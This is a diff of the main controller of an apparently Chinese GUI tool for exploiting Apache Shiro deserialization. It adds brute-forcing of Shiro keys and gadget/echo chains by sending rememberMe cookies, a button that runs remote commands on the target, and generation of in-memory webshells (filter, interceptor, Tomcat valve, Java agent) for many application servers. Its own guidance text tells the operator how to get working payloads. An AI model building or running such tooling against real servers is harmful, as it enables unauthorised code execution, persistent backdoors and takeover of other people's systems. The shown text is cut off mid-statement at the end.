+        this.jmgServerOpt.setItems(FXCollections.observableArrayList(new String[]{"SERVER_TOMCAT", "SERVER_SPRING_MVC", "SERVER_RESIN", "SERVER_WEBLOGIC", "SERVER_JETTY", "SERVER_WEBSPHERE", "SERVER_UNDERTOW", "SERVER_GLASSFISH", "SERVER_APUSIC", "SERVER_BES", "SERVER_INFORSUITE", "SERVER_TONGWEB"}));
         this.jmgServerOpt.setValue("SERVER_TOMCAT");
-        this.jmgShellOpt.setItems(FXCollections.observableArrayList(new String[]{"SHELL_LISTENER", "SHELL_FILTER", "SHELL_SERVLET"}));
+        this.jmgShellOpt.setItems(FXCollections.observableArrayList(new String[]{"SHELL_LISTENER", "SHELL_FILTER", "SHELL_INTERCEPTOR", "SHELL_HANDLERMETHOD", "SHELL_TOMCATVALVE"}));
         this.jmgShellOpt.setValue("SHELL_LISTENER");
-        this.jmgFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64"}));
+        this.jmgFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64", "FORMAT_BCEL", "FORMAT_BIGINTEGER", "FORMAT_CLASS", "FORMAT_JAR", "FORMAT_JAR_AGENT", "FORMAT_JS", "FORMAT_JSP"}));
         this.jmgFormatOpt.setValue("FORMAT_BASE64");
         this.jmgGadgetOpt.setItems(FXCollections.observableArrayList(new String[]{"GADGET_NONE"}));
         this.jmgGadgetOpt.setValue("GADGET_NONE");
+        this.jmgServerOpt.valueProperty().addListener((obs, oldVal, newVal) -> this.adjustJmgShellForServer(newVal));
+        this.adjustJmgShellForServer(this.jmgServerOpt.getValue());
+
+        this.changeKeyVariantOpt.setItems(FXCollections.observableArrayList(
+                "filterConfigs -> shiroFilterFactoryBean",
+                "getFilterRegistration -> shiroFilterFactoryBean",
+                "filterConfigs -> 常见 Shiro 名依次匹配",
+                "getFilterRegistration -> 常见 Shiro 名依次匹配",
+                "filterConfigs -> 包含 shiro 的名称扫描",
+                "高风险: 全候选 rememberMeManager 扫描"));
+        this.changeKeyVariantOpt.setValue("filterConfigs -> shiroFilterFactoryBean");
+        this.initChangeKeyHistoryCombo();
+        this.updateKeyCrackProgress(0, 0, "Key 爆破状态：待开始");
+        this.setKeyCrackButtonsDisabled(false);
+        ToggleGroup langGroup = new ToggleGroup();
+        this.langZhMenuItem.setToggleGroup(langGroup);
+        this.langEnMenuItem.setToggleGroup(langGroup);
+        this.langZhMenuItem.setSelected(true);
+        this.applyLanguage();
+    }
+
+
+    private void applyProxyCredentialsToAuthenticator(String user, String password) {
+        if (user != null && !user.trim().isEmpty()) {
+            final String fu = user.trim();
+            final char[] fpChars = password != null ? password.toCharArray() : new char[0];
+            Authenticator.setDefault(new Authenticator() {
+                @Override
+                public PasswordAuthentication getPasswordAuthentication() {
+                    return new PasswordAuthentication(fu, fpChars);
+                }
+            });
+        } else {
+            Authenticator.setDefault(null);
+        }
+    }
+
+    private void restoreSavedProxyAuthenticator() {
+        Object u = currentProxy.get("username");
+        Object p = currentProxy.get("password");
+        this.applyProxyCredentialsToAuthenticator(
+                u != null ? String.valueOf(u) : "",
+                p != null ? String.valueOf(p) : "");
     }
 
     private void initToolbar() {
@@ -380,6 +761,7 @@ public class MainController {
             Button cancelBtn = new Button("取消");
             Button saveBtn = new Button("保存");
             saveBtn.setDefaultButton(true);
+            AppLogger.info("打开代理设置窗口");
             if (currentProxy.get("proxy") != null) {
                 Proxy currProxy = (Proxy)currentProxy.get("proxy");
                 String proxyInfo = currProxy.address().toString();
@@ -393,29 +775,106 @@ public class MainController {
             } else {
                 enableRadio.setSelected(false);
             }
+            if (currentProxy.get("username") != null) {
+                userNameText.setText(String.valueOf(currentProxy.get("username")));
+            }
+            if (currentProxy.get("password") != null) {
+                passwordText.setText(String.valueOf(currentProxy.get("password")));
+            }
+
+            Label testUrlLabel = new Label("测试 URL：");
+            TextField testUrlText = new TextField("http://www.baidu.com");
+            testUrlText.setPromptText("http:// 或 https://");
+            Button testProxyBtn = new Button("测试连接");
+            HBox testUrlRow = new HBox(10.0D);
+            testUrlRow.setAlignment(Pos.CENTER_LEFT);
+            testUrlRow.getChildren().add(testUrlText);
+            testUrlRow.getChildren().add(testProxyBtn);
+            HBox.setHgrow(testUrlText, Priority.ALWAYS);
+
+            testProxyBtn.setOnAction((ev) -> {
+                String ipAddress = IPText.getText().trim();
+                String portStr = PortText.getText().trim();
+                if (ipAddress.isEmpty() || portStr.isEmpty()) {
+                    (new Alert(AlertType.WARNING, "请填写 IP 与端口")).showAndWait();
+                    return;
+                }
+                int port;
+                try {
+                    port = Integer.parseInt(portStr);
+                } catch (NumberFormatException nfe) {
+                    (new Alert(AlertType.WARNING, "端口必须是有效数字")).showAndWait();
+                    return;
+                }
+                String typeVal = typeCombo.getValue() != null ? typeCombo.getValue().toString() : "HTTP";
+                InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, port);
+                Proxy testProxy;
+                if ("SOCKS".equals(typeVal)) {
+                    testProxy = new Proxy(Type.SOCKS, proxyAddr);
+                } else {
+                    testProxy = new Proxy(Type.HTTP, proxyAddr);
+                }
+                final String testTarget;
+                String rawUrl = testUrlText.getText().trim();
+                if (rawUrl.isEmpty()) {
+                    testTarget = "http://www.baidu.com";
+                } else {
+                    testTarget = rawUrl;
+                }
+                testProxyBtn.setDisable(true);
+                final String u = userNameText.getText();
+                final String p = passwordText.getText();
+                (new Thread(() -> {
+                    this.applyProxyCredentialsToAuthenticator(u, p);
+                    try {
+                        int timeoutMs = 10000;
+                        try {
+                            String sec = MainController.this.httpTimeout.getText();
+                            if (sec != null && !sec.trim().isEmpty()) {
+                                timeoutMs = Math.max(1000, Integer.parseInt(sec.trim()) * 1000);
+                            }
+                        } catch (NumberFormatException ignored) {
+                        }
+                        String msg = HttpUtil.testProxyConnection(testProxy, testTarget, timeoutMs);
+                        Platform.runLater(() -> {
+                            testProxyBtn.setDisable(false);
+                            Alert ok = new Alert(AlertType.INFORMATION);
+                            ok.setTitle("代理测试");
+                            ok.setHeaderText("连接成功");
+                            ok.setContentText(msg);
+                            ok.showAndWait();
+                        });
+                    } catch (Exception ex) {
+                        String detail = ex.getMessage();
+                        if (detail == null || detail.isEmpty()) {
+                            detail = ex.toString();
+                        }
+                        String finalDetail = detail;
+                        Platform.runLater(() -> {
+                            testProxyBtn.setDisable(false);
+                            Alert err = new Alert(AlertType.ERROR);
+                            err.setTitle("代理测试");
+                            err.setHeaderText("连接失败");
+                            err.setContentText(finalDetail);
+                            err.setResizable(true);
+                            err.showAndWait();
+                        });
+                    } finally {
+                        this.restoreSavedProxyAuthenticator();
+                    }
+                }, "proxy-connection-test")).start();
+            });
 
             saveBtn.setOnAction((e) -> {
                 if (disableRadio.isSelected()) {
                     currentProxy.put("proxy", (Object)null);
+                    AppLogger.info("保存代理设置: enabled=false");
                     this.proxyStatusLabel.setText("");
                     inputDialog.getDialogPane().getScene().getWindow().hide();
                 } else {
                     String type;
                     String ipAddress;
-                    if (!userNameText.getText().trim().equals("")) {
-                        ipAddress = userNameText.getText().trim();
-                        type = passwordText.getText();
-                        String finalIpAddress = ipAddress;
-                        String finalType = type;
-                        Authenticator.setDefault(new Authenticator() {
-                            @Override
-                            public PasswordAuthentication getPasswordAuthentication() {
-                                return new PasswordAuthentication(finalIpAddress, finalType.toCharArray());
-                            }
-                        });
-                    } else {
-                        Authenticator.setDefault((Authenticator)null);
-                    }
+                    this.applyProxyCredentialsToAuthenticator(userNameText.getText(), passwordText.getText());
 
                     currentProxy.put("username", userNameText.getText());
                     currentProxy.put("password", passwordText.getText());
@@ -432,6 +891,7 @@ public class MainController {
                         currentProxy.put("proxy", proxy);
                     }
 
+                    AppLogger.info("保存代理设置: enabled=true, type=" + type + ", host=" + ipAddress + ", port=" + port);
                     this.proxyStatusLabel.setText("代理生效中: " + ipAddress + ":" + port);
                     inputDialog.getDialogPane().getScene().getWindow().hide();
                 }
@@ -451,13 +911,15 @@ public class MainController {
             proxyGridPane.add(userNameText, 1, 4);
             proxyGridPane.add(passwordLabel, 0, 5);
             proxyGridPane.add(passwordText, 1, 5);
+            proxyGridPane.add(testUrlLabel, 0, 6);
+            proxyGridPane.add(testUrlRow, 1, 6);
             HBox buttonBox = new HBox();
             buttonBox.setSpacing(20.0D);
             buttonBox.setAlignment(Pos.CENTER);
             buttonBox.getChildren().add(cancelBtn);
             buttonBox.getChildren().add(saveBtn);
             GridPane.setColumnSpan(buttonBox, 2);
-            proxyGridPane.add(buttonBox, 0, 6);
+            proxyGridPane.add(buttonBox, 0, 7);
             inputDialog.getDialogPane().setContent(proxyGridPane);
             inputDialog.showAndWait();
         });
@@ -472,22 +934,533 @@ public class MainController {
     }
 
     @FXML
+    void crackSpcGadgetBtn(ActionEvent event) {
+        this.initAttack();
+        AppLogger.info("检测当前利用链");
+        if (!this.attackService.checkIsShiro()) {
+            return;
+        }
+        String spcShiroKey = this.shiroKey.getText();
+        if (spcShiroKey == null || spcShiroKey.trim().isEmpty()) {
+            this.logTextArea.appendText(Utils.log("请先输入或获取可用 Shiro Key"));
+            return;
+        }
+        String gadget = this.gadgetOpt.getValue();
+        String echo = this.echoOpt.getValue();
+        if (gadget == null || gadget.trim().isEmpty() || echo == null || echo.trim().isEmpty()) {
+            this.logTextArea.appendText(Utils.log("请选择利用链和回显类型"));
+            return;
+        }
+        boolean ok = this.attackService.gadgetCrack(gadget, echo, spcShiroKey.trim());
+        if (!ok) {
+            this.logTextArea.appendText(Utils.log("[-] 当前利用链未命中，请尝试更换组合"));
+        }
+    }
+
+    @FXML
+    void crackGadgetBtn(ActionEvent event) {
+        this.initAttack();
+        AppLogger.info("爆破利用链及回显");
+        if (!this.attackService.checkIsShiro()) {
+            return;
+        }
+        String spcShiroKey = this.shiroKey.getText();
+        if (spcShiroKey == null || spcShiroKey.trim().isEmpty()) {
+            spcShiroKey = AttackService.realShiroKey;
+        }
+        if (spcShiroKey == null || spcShiroKey.trim().isEmpty()) {
+            this.logTextArea.appendText(Utils.log("请先输入或获取可用 Shiro Key"));
+            return;
+        }
+        Task<Boolean> running = this.crackTaskRef;
+        if (running != null && running.isRunning()) {
+            this.logTextArea.appendText(Utils.log("利用链爆破任务正在运行中"));
+            return;
+        }
+        final List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
+        final String key = spcShiroKey.trim();
+        this.crackStartMillis = System.currentTimeMillis();
+        this.updateCrackProgress(0, targets.size(), "开始爆破");
+        this.setCrackButtonsDisabled(true);
+        Task<Boolean> task = new Task<Boolean>() {
+            @Override
+            protected Boolean call() {
+                int total = targets.size();
+                for (int i = 0; i < total; i++) {
+                    if (this.isCancelled()) {
+                        updateMessage("已停止");
+                        updateProgress(i, total);
+                        return false;
+                    }
+                    String pair = targets.get(i);
+                    String[] parts = pair.split(":", 2);
+                    String gadget = parts[0];
+                    String echo = parts.length > 1 ? parts[1] : "";
+                    updateMessage(gadget + " / " + echo);
+                    updateProgress(i, total);
+                    boolean matched = MainController.this.attackService.gadgetCrack(gadget, echo, key);
+                    if (matched) {
+                        updateProgress(i + 1, total);
+                        updateMessage("命中: " + gadget + " / " + echo);
+                        return true;
+                    }
+                }
+                updateProgress(total, total);
+                updateMessage("未找到可用组合");
+                return false;
+            }
+        };
+        task.progressProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
+            int total = targets.size();
+            double progress = newVal == null ? 0.0D : newVal.doubleValue();
+            int current = total <= 0 ? 0 : (int) Math.round(progress * total);
+            MainController.this.updateCrackProgress(Math.min(current, total), total, task.getMessage());
+        }));
+        task.messageProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
+            double progress = task.getProgress();
+            int total = targets.size();
+            int current = total <= 0 || progress < 0 ? 0 : (int) Math.round(progress * total);
+            MainController.this.updateCrackProgress(Math.min(current, total), total, newVal);
+        }));
+        task.setOnSucceeded(workerStateEvent -> {
+            this.crackTaskRef = null;
+            this.setCrackButtonsDisabled(false);
+            boolean matched = Boolean.TRUE.equals(task.getValue());
+            if (matched) {
+                this.updateCrackProgress(targets.size(), targets.size(), "已找到可用组合");
+            } else {
+                this.updateCrackProgress(targets.size(), targets.size(), "未找到可用组合");
+                this.logTextArea.appendText(Utils.log("[-] 利用链与回显全部测试完毕，未发现可用组合"));
+            }
+        });
+        task.setOnCancelled(workerStateEvent -> {
+            this.crackTaskRef = null;
+            this.setCrackButtonsDisabled(false);
+            this.updateCrackProgress(0, targets.size(), "已停止");
+            this.logTextArea.appendText(Utils.log("[!] 已停止利用链爆破任务"));
+        });
+        task.setOnFailed(workerStateEvent -> {
+            this.crackTaskRef = null;
+            this.setCrackButtonsDisabled(false);
+            Throwable ex = task.getException();
+            String msg = ex != null && ex.getMessage() != null ? ex.getMessage() : "未知异常";
+            this.updateCrackProgress(0, targets.size(), "执行失败");
+            this.logTextArea.appendText(Utils.log("[!] 利用链爆破任务失败: " + msg));
+            if (ex != null) {
+                AppLogger.error("利用链爆破任务失败", ex);
+            }
+        });
+        this.crackTaskRef = task;
+        Thread worker = new Thread(task, "gadget-crack-task");
+        worker.setDaemon(true);
+        worker.start();
+    }
+
+    @FXML
+    void cancelCrackBtn(ActionEvent event) {
+        Task<Boolean> running = this.crackTaskRef;
+        if (running != null && running.isRunning()) {
+            AppLogger.info("停止利用链爆破任务");
+            running.cancel();
+        } else {
+            this.updateCrackProgress(0, 0, "利用链爆破状态：待开始");
+            this.setCrackButtonsDisabled(false);
+        }
+    }
+
+    @FXML
+    void cancelKeyCrackBtn(ActionEvent event) {
+        Task<Boolean> running = this.keyCrackTaskRef;
+        if (running != null && running.isRunning()) {
+            AppLogger.info("停止 Key 爆破任务");
+            running.cancel();
+        } else {
+            this.updateKeyCrackProgress(0, 0, "Key 爆破状态：待开始");
+            this.setKeyCrackButtonsDisabled(false);
+        }
+    }
+
+    @FXML
+    void executeCmdBtn(ActionEvent event) {
+        this.initAttack();
+        AppLogger.info("执行命令");
+        String command = this.exCommandText.getText();
+        if (command == null || command.trim().isEmpty()) {
+            this.execOutputArea.appendText(Utils.log("请输入命令"));
+            return;
+        }
+        if (AttackService.gadget == null || AttackService.attackRememberMe == null || AttackService.attackRememberMe.trim().isEmpty()) {
+            this.execOutputArea.appendText(Utils.log("请先完成利用链检测，再执行命令"));
+            return;
+        }
+        try {
+            String output = this.attackService.execCmdTask(command.trim());
+            this.execOutputArea.appendText("[command] " + command.trim() + "\n");
+            if (output == null) {
+                this.execOutputArea.appendText("[result] 目标无响应\n");
+            } else if (output.isEmpty()) {
+                this.execOutputArea.appendText("[result] 命令已执行,返回为空\n");
+            } else {
+                this.execOutputArea.appendText(output);
+                if (!output.endsWith("\n")) {
+                    this.execOutputArea.appendText("\n");
+                }
+            }
+            this.execOutputArea.appendText("-----------------------------------------------------------------------\n");
+        } catch (Exception ex) {
+            String msg = ex.getMessage() != null ? ex.getMessage() : ex.toString();
+            this.execOutputArea.appendText("[command] " + command.trim() + "\n");
+            this.execOutputArea.appendText("[error] " + msg + "\n");
+            this.execOutputArea.appendText("-----------------------------------------------------------------------\n");
+            AppLogger.error("命令执行失败", ex);
+        }
+    }
+
+    private void setCrackButtonsDisabled(boolean disabled) {
+        if (this.crackSpcGadgetBtn != null) {
+            this.crackSpcGadgetBtn.setDisable(disabled);
+        }
+        if (this.crackGadgetBtn != null) {
+            this.crackGadgetBtn.setDisable(disabled);
+        }
+        if (this.cancelCrackBtn != null) {
+            this.cancelCrackBtn.setDisable(!disabled);
+        }
+    }
+
+    private void setKeyCrackButtonsDisabled(boolean disabled) {
+        if (this.crackSpcKeyBtn != null) {
+            this.crackSpcKeyBtn.setDisable(disabled);
+        }
+        if (this.crackKeyBtn != null) {
+            this.crackKeyBtn.setDisable(disabled);
+        }
+        if (this.cancelKeyCrackBtn != null) {
+            this.cancelKeyCrackBtn.setDisable(!disabled);
+        }
+    }
+
+    private void updateKeyCrackProgress(int current, int total, String text) {
+        if (this.keyCrackProgressBar != null) {
+            double progress = total <= 0 ? 0.0D : Math.min(1.0D, Math.max(0.0D, (double) current / (double) total));
+            this.keyCrackProgressBar.setProgress(progress);
+        }
+        if (this.keyCrackProgressLabel != null) {
+            String elapsed = "";
+            if (this.keyCrackStartMillis > 0L) {
+                long seconds = Math.max(0L, (System.currentTimeMillis() - this.keyCrackStartMillis) / 1000L);
+                elapsed = "（耗时 " + seconds + "s）";
+            }
+            if (text == null || text.trim().isEmpty()) {
+                if (total > 0) {
+                    this.keyCrackProgressLabel.setText("Key 进度：" + current + "/" + total + elapsed);
+                } else {
+                    this.keyCrackProgressLabel.setText("Key 爆破状态：待开始");
+                }
+            } else if (total > 0) {
+                this.keyCrackProgressLabel.setText("Key 进度：" + current + "/" + total + " - " + text + elapsed);
+            } else {
+                this.keyCrackProgressLabel.setText(text + elapsed);
+            }
+        }
+    }
+
+    private void startKeyCrackTask(List<String> shiroKeys, boolean multiShiroMode) {
+        if (shiroKeys == null || shiroKeys.isEmpty()) {
+            this.logTextArea.appendText(Utils.log("未读取到可用于爆破的 Key 列表"));
+            return;
+        }
+        final List<String> keys = new ArrayList<String>(shiroKeys);
+        this.keyCrackStartMillis = System.currentTimeMillis();
+        this.updateKeyCrackProgress(0, keys.size(), multiShiroMode ? "开始多 Shiro 场景爆破" : "开始爆破");
+        this.setKeyCrackButtonsDisabled(true);
+        this.logTextArea.appendText(Utils.log("[*] 开始爆破 Key，共 " + keys.size() + " 个候选"));
+        if (multiShiroMode) {
+            this.logTextArea.appendText(Utils.log("[*] 当前疑似多 Shiro 场景，将按 deleteMe 数量变化判断"));
+        }
+
+        Task<Boolean> task = new Task<Boolean>() {
+            @Override
+            protected Boolean call() {
+                int total = keys.size();
+                for (int i = 0; i < total; i++) {
+                    if (this.isCancelled()) {
+                        updateMessage("已停止");
+                        updateProgress(i, total);
+                        return false;
+                    }
+                    String shirokey = keys.get(i);
+                    updateMessage(shirokey);
+                    updateProgress(i, total);
+                    try {
+                        String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, MainController.this.attackService.shiroKeyWord, shirokey);
+                        HashMap<String, String> header = new HashMap<String, String>();
+                        header.put("Cookie", rememberMe);
+                        String result = MainController.this.attackService.headerHttpRequest(header);
+                        Thread.sleep(100L);
+                        boolean matched;
+                        if (multiShiroMode) {
+                            matched = result != null && !result.isEmpty() && MainController.this.attackService.countDeleteMe(result) < MainController.this.attackService.flagCount;
+                        } else {
+                            matched = result != null && !result.isEmpty() && !result.contains("=deleteMe");
+                        }
+                        if (matched) {
+                            AttackService.realShiroKey = shirokey;
+                            final String foundKey = shirokey;
+                            Platform.runLater(() -> {
+                                MainController.this.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
+                                MainController.this.shiroKey.setText(foundKey);
+                            });
+                            updateProgress(i + 1, total);
+                            updateMessage("命中: " + shirokey);
+                            return true;
+                        }
+                        final String failKey = shirokey;
+                        Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey)));
+                    } catch (Exception ex) {
+                        final String failKey = shirokey;
+                        final String errMsg = ex.getMessage();
+                        Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey + " " + errMsg)));
+                    }
+                }
+                updateProgress(total, total);
+                updateMessage("未找到可用 Key");
+                return false;
+            }
+        };
+
+        task.progressProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
+            int total = keys.size();
+            double progress = newVal == null ? 0.0D : newVal.doubleValue();
+            int current = total <= 0 ? 0 : (int) Math.round(progress * total);
+            MainController.this.updateKeyCrackProgress(Math.min(current, total), total, task.getMessage());
+        }));
+        task.messageProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
+            double progress = task.getProgress();
+            int total = keys.size();
+            int current = total <= 0 || progress < 0 ? 0 : (int) Math.round(progress * total);
+            MainController.this.updateKeyCrackProgress(Math.min(current, total), total, newVal);
+        }));
+        task.setOnSucceeded(workerStateEvent -> {
+            this.keyCrackTaskRef = null;
+            this.keyCrackStartMillis = 0L;
+            this.setKeyCrackButtonsDisabled(false);
+            boolean matched = Boolean.TRUE.equals(task.getValue());
+            if (matched) {
+                this.updateKeyCrackProgress(keys.size(), keys.size(), "已找到可用 Key");
+            } else {
+                this.updateKeyCrackProgress(keys.size(), keys.size(), "未找到可用 Key");
+                this.logTextArea.appendText(Utils.log("[-] Key 全部测试完毕，未发现可用值"));
+            }
+            this.logTextArea.appendText(Utils.log("[+] 爆破结束"));
+        });
+        task.setOnCancelled(workerStateEvent -> {
+            this.keyCrackTaskRef = null;
+            this.keyCrackStartMillis = 0L;
+            this.setKeyCrackButtonsDisabled(false);
+            this.updateKeyCrackProgress(0, keys.size(), "已停止");
+            if (this.keyCrackProgressBar != null) {
+                this.keyCrackProgressBar.setProgress(0.0D);
+            }
+            this.logTextArea.appendText(Utils.log("[!] 已停止 Key 爆破任务"));
+        });
+        task.setOnFailed(workerStateEvent -> {
+            this.keyCrackTaskRef = null;
+            this.keyCrackStartMillis = 0L;
+            this.setKeyCrackButtonsDisabled(false);
+            Throwable ex = task.getException();
+            String msg = ex != null && ex.getMessage() != null ? ex.getMessage() : "未知异常";
+            this.updateKeyCrackProgress(0, keys.size(), "执行失败");
+            this.logTextArea.appendText(Utils.log("[!] Key 爆破任务失败: " + msg));
+            if (ex != null) {
+                AppLogger.error("Key 爆破任务失败", ex);
+            }
+        });
+        this.keyCrackTaskRef = task;
+        Thread worker = new Thread(task, "key-crack-task");
+        worker.setDaemon(true);
+        worker.start();
+    }
+
+    private void updateCrackProgress(int current, int total, String text) {
+        if (this.crackProgressBar != null) {
+            double progress = total <= 0 ? 0.0D : Math.min(1.0D, Math.max(0.0D, (double) current / (double) total));
+            this.crackProgressBar.setProgress(progress);
+        }
+        if (this.crackProgressLabel != null) {
+            String elapsed = "";
+            if (this.crackStartMillis > 0L) {
+                long seconds = Math.max(0L, (System.currentTimeMillis() - this.crackStartMillis) / 1000L);
+                elapsed = "（耗时 " + seconds + "s）";
+            }
+            if (text == null || text.trim().isEmpty()) {
+                if (total > 0) {
+                    this.crackProgressLabel.setText("进度：" + current + "/" + total + elapsed);
+                } else {
+                    this.crackProgressLabel.setText("利用链爆破状态：待开始");
+                }
+            } else if (total > 0) {
+                this.crackProgressLabel.setText("进度：" + current + "/" + total + " - " + text + elapsed);
+            } else {
+                this.crackProgressLabel.setText(text + elapsed);
+            }
+        }
+    }
+
+    private void adjustJmgShellForServer(String serverType) {
+        if (this.jmgShellOpt == null || serverType == null) {
+            return;
+        }
+        if ("SERVER_SPRING_MVC".equals(serverType)) {
+            String current = this.jmgShellOpt.getValue();
+            if (current == null || "SHELL_LISTENER".equals(current) || "SHELL_TOMCATVALVE".equals(current)) {
+                this.jmgShellOpt.setValue("SHELL_FILTER");
+            }
+        }
+    }
+
+    private String buildJmgSelectionWarning(String serverType, String shellType) {
+        if ("SERVER_SPRING_MVC".equals(serverType) && "SHELL_LISTENER".equals(shellType)) {
+            return "当前组合为 SERVER_SPRING_MVC + SHELL_LISTENER。\n\n"
+                    + "该组合在不少 jMG 版本中稳定性较差，常见现象就是 Javassist 生成阶段直接报 syntax error。\n\n"
+                    + "建议改用：\n"
+                    + "1）SHELL_FILTER（首选）\n"
+                    + "2）SHELL_INTERCEPTOR（次选）\n\n"
+                    + "本次已按你当前选择继续尝试；若失败请先切换马类型再生成。";
+        }
+        return null;
+    }
+
+    private String normalizeEchoSource(String source) {
+        if (source == null) {
+            return "Legacy";
+        }
+        if ("传统模式".equalsIgnoreCase(source) || "Legacy".equalsIgnoreCase(source)) {
+            return "Legacy";
+        }
+        return source;
+    }
+
+    private String normalizeMemshellSource(String source) {
+        if (source == null) {
+            return "Legacy";
+        }
+        if ("传统模式".equalsIgnoreCase(source) || "Legacy".equalsIgnoreCase(source)) {
+            return "Legacy";
+        }
+        return source;
+    }
+
+    private String displaySourceName(String source) {
+        if (source == null || source.trim().isEmpty()) {
+            return "传统模式";
+        }
+        if ("Legacy".equalsIgnoreCase(source) || "传统模式".equalsIgnoreCase(source)) {
+            return "传统模式";
+        }
+        return source;
+    }
+
+    private String buildEchoFailureGuidance(EchoGenerateResult result) {
+        String src = result != null && result.getSource() != null ? result.getSource() : "";
+        String msg = result != null && result.getMessage() != null ? result.getMessage() : "(无详情)";
+        StringBuilder sb = new StringBuilder();
+        sb.append("服务端返回/内部信息：").append(msg).append("\n\n");
+        if ("Legacy".equalsIgnoreCase(src)) {
+            sb.append("常见原因：\n");
+            sb.append("· Shiro Key 不正确或未与目标一致；\n");
+            sb.append("· 所选利用链、回显与目标 classpath（如 commons-beanutils 版本）不匹配；\n");
+            sb.append("· 非 JDK 8 运行导致序列化/Gadget 行为与预期不一致。\n\n");
+            sb.append("建议操作：\n");
+            sb.append("1）在「指定Key」填写正确 Base64 Key，或先「爆破密钥」成功后再生成；\n");
+            sb.append("2）「来源」保持 传统模式（默认），多换几组「利用链 + 回显」；\n");
+            sb.append("3）使用 JDK 8（含 JavaFX）启动本工具后重试。\n");
+        } else {
+            sb.append("常见原因：jEG 依赖未就绪、选项与目标容器不符（如 Spring 须选正确 Server 常量）。\n\n");
+            sb.append("建议操作：\n");
+            sb.append("1）将「来源」改为 传统模式 使用内置链；\n");
+            sb.append("2）按项目文档安装 jEG-core；\n");
+            sb.append("3）核对 jEG 的 Server/Model 与目标环境。\n");
+        }
+        return sb.toString();
+    }
+
+    private String buildMemshellFailureGuidance(MemshellGenerateResult result) {
+        String src = result != null && result.getSource() != null ? result.getSource() : "";
+        String msg = result != null && result.getMessage() != null ? result.getMessage() : "(无详情)";
+        StringBuilder sb = new StringBuilder();
+        sb.append("服务端返回/内部信息：").append(msg).append("\n\n");
+        if ("Legacy".equalsIgnoreCase(src)) {
+            sb.append("常见原因：所选内存马类型无对应模板，或本地依赖异常。\n\n");
+            sb.append("建议：在「内存马注入」页确认类型存在，或检查 lib/ 与 MemBytes 配置。\n");
+        } else {
+            sb.append("常见原因：jMG 依赖未安装、Tool/Server/Shell 选项与目标不符。\n\n");
+            sb.append("建议：将「来源」改为 传统模式；或按文档安装 jmg-sdk 并调整各下拉项。\n");
+        }
+        return sb.toString();
+    }
+
+    @FXML
     void genEchoBtn(ActionEvent actionEvent) {
         if (this.attackService == null) {
             this.initAttack();
         }
         String source = this.echoSourceOpt.getValue();
+        AppLogger.info("回显生成: source=" + source + ", server=" + this.jegServerOpt.getValue() + ", model=" + this.jegModelOpt.getValue() + ", format=" + this.jegFormatOpt.getValue());
+        if (source == null || source.trim().isEmpty()) {
+            source = "传统模式";
+            this.echoSourceOpt.setValue("传统模式");
+        }
+        source = this.normalizeEchoSource(source);
         String key = this.shiroKey.getText();
-        EchoGenerateResult result = this.attackService.generateEchoWithThirdParty(
-            source,
-            this.jegServerOpt.getValue(),
-            this.jegModelOpt.getValue(),
-            this.jegFormatOpt.getValue(),
-            this.gadgetOpt.getValue(),
-            this.echoOpt.getValue(),
-            key
-        );
-        this.echoGeneratorOutput.appendText("[" + result.getSource() + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
+        if (key == null || key.trim().isEmpty()) {
+            key = AttackService.realShiroKey;
+        }
+        if (key == null || key.trim().isEmpty()) {
+            if (!"jEG".equalsIgnoreCase(source)) {
+                this.echoGeneratorOutput.appendText("[传统模式/jEG 回显] 需要 Shiro Key：请在「指定Key」填写 Base64 key，或先爆破成功后再生成。\n");
+                this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
+                this.showGuidanceAlert(
+                        AlertType.WARNING,
+                        "缺少 Shiro Key",
+                        "无法构造 rememberMe 载荷",
+                        "原因：Echo 生成必须用 AES Key（Base64）加密序列化数据。\n\n"
+                                + "请：\n"
+                                + "1）在「指定Key」中粘贴正确 Key；或\n"
+                                + "2）先对目标「爆破密钥」，成功后会自动填入可用 Key。\n\n"
+                                + "完成后再点「生成/回退生成」。");
+                return;
+            }
+            this.echoGeneratorOutput.appendText("[提示] 当前未填写 Shiro Key，jEG 将仅尝试输出第三方原始 payload；若需回退传统模式或生成最终 rememberMe，请先提供 Base64 key。\n");
+        }
+        EchoGenerateResult result;
+        try {
+            result = this.attackService.generateEchoWithThirdParty(
+                    source,
+                    this.jegServerOpt.getValue(),
+                    this.jegModelOpt.getValue(),
+                    this.jegFormatOpt.getValue(),
+                    this.gadgetOpt.getValue(),
+                    this.echoOpt.getValue(),
+                    key
+            );
+        } catch (Exception ex) {
+            this.echoGeneratorOutput.appendText("[Echo] exception: " + ex.getMessage() + "\n");
+            this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
+            this.showGuidanceAlert(
+                    AlertType.ERROR,
+                    "Echo 生成异常",
+                    ex.getClass().getSimpleName(),
+                    "未预期异常：" + ex.getMessage() + "\n\n"
+                            + "请检查：目标 URL、网络与代理、JDK 是否为 8；仍失败请携带本段日志反馈。\n");
+            return;
+        }
+        this.echoGeneratorOutput.appendText("[" + this.displaySourceName(result.getSource()) + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
+        if (result.getServerType() != null || result.getModelType() != null || result.getFormatType() != null) {
+            this.echoGeneratorOutput.appendText("selection: server=" + String.valueOf(result.getServerType())
+                    + ", model=" + String.valueOf(result.getModelType())
+                    + ", format=" + String.valueOf(result.getFormatType()) + "\n");
+        }
         if (result.getRequestHeaderName() != null && !result.getRequestHeaderName().isEmpty()) {
             this.echoGeneratorOutput.appendText("header: " + result.getRequestHeaderName() + "\n");
         }
@@ -498,6 +1471,13 @@ public class MainController {
             this.echoGeneratorOutput.appendText("message: " + result.getMessage() + "\n");
         }
         this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
+        if (!result.isSuccess()) {
+            this.showGuidanceAlert(
+                    AlertType.WARNING,
